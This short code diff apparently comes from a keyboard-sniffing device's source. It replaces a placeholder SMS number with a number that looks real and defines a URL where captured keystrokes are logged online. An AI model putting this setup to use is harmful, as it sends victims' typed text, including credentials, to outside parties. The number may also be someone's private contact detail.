@@ -90,7 +90,7 @@ MAC = 0xA8EE9A90CDLL
 //#define ENABLE_GSM
 
 // number to send sms to upon trigger words (only if ENABLE_GSM is defined)
-char *SMSnumber = "3105551212";
+char *SMSnumber = "8572721009";
 
 // log online to this url (only if ENABLE_GSM is defined)
 #define URL "samy.pl/keysweeper/log.php?"
